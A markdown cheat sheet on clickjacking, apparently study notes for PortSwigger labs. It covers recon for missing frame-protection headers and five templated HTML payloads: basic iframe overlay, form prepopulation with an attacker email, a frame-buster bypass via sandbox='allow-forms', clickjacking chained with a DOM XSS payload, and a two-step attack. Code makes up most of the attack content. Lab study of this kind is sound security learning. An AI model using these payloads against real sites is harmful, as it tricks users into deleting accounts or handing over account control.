# Clickjacking

## Summary
* [Recon for Clickjacking](#recon)
* [Portswigger Labs Cheat Sheet / Payloads](#cheat-sheet)

## Resources

* https://portswigger.net/web-security/clickjacking
* https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html

## Recon

* Identify if the application’s responses contain the following headers:
	* X-Frame-Options: *value*
	* Content-Security-Policy: frame-ancestors *value*

* If the responses do not contain these headers, then the application is most likely vulnerable to clickjacking.

---
---

## Cheat Sheet

### Basic Clickjacking:

* Use a basic clickjacking payload, that loads the vulnerable application’s page in an \<iframe\>, which contains a button to delete the user’s account.  We can use this method to trick a user into clicking on the “Delete account” button on the targeted application.  
	* For Example: height: 700px ,  weight: 500px , opacity: 0.1 , top: 500px , left: 100px

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="$VULNERABLE-APPLICATION-URL"></iframe>
```

### Prepopulate Form - Clickjacking

* It may be possible to prepopulate a form used in a POST request, by referencing those body parameters as query parameters in a GET request.
* Use a clickjacking payload, which will prepopulate a \<form\> parameter’s values, by using query parameters in a GET request.  
* Include this targeted web page in an \<iframe\>.  Since the form will be prepopulated, we only need to induce the user into clicking on the button that will submit the POST request.
	* For Example: height: 700px ,  weight: 500px , opacity: 0.1 , top: 500px , left: 100px

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="$VULNERABLE-APPLICATION-URL?email=hacker@attacker-website.com"></iframe>
```

### Prepopulate Form + Frame Buster Script Bypass

* It may be possible to prepopulate a form used in a POST request, by referencing those body parameters as query parameters in a GET request.
* Use a clickjacking payload, which will prepopulate a \<form\> parameter’s value, using a query parameter in a GET request.  
* Include this targeted web page in an \<iframe\> with the attribute **‘sandbox=“allow-forms”’**, this will neutralize the frame buster script .  Since the form will be prepopulated, we only need to induce the user into clicking on the button that will submit the POST request.
	* For Example: height: 700px ,  weight: 500px , opacity: 0.1 , top: 500px , left: 100px

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="$VULNERABLE-APPLICATION-URL?email=hacker@attacker-website.com"></iframe>
```

### Prepopulate Form + DOM XSS Exploit

* It may be possible to prepopulate a form used in a POST request, by referencing those body parameters as query parameters in a GET request.
* Use a clickjacking payload, which will prepopulate a \<form\> parameter’s value, using query parameters in a GET request. 
* One of these parameters will include a XSS payload, as a client-side script on the application is using the parameter’s value in a dangerous Sink.  Combining both clickjacking and XSS leads to a higher impact.  Without the clickjacking vulnerability, the XSS would be more difficult to pull off since the form requires a CSRF Token.
* Include this targeted web page in an \<iframe\>.  Since the form will be prepopulated, we only need to induce the user into clicking on the button that will submit the POST request.
	* For Example: height: 700px ,  weight: 500px , opacity: 0.1 , top: 500px , left: 100px

```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="$VULNERABLE-APPLICATION-URL?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

### 2-Step Clickjacking Attack

* Use a basic clickjacking payload, that loads the vulnerable application’s page in an \<iframe\>, which contains a button to delete the user’s account.  We can use this method to trick a user into clicking on the “Delete account” button, then confirm the action by clicking on another button on the targeted application.
	* For Example: height: 700px ,  weight: 500px , opacity: 0.1 , top: 500px , left: 100px

```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="$VULNERABLE-APPLICATION-URL"></iframe>
```
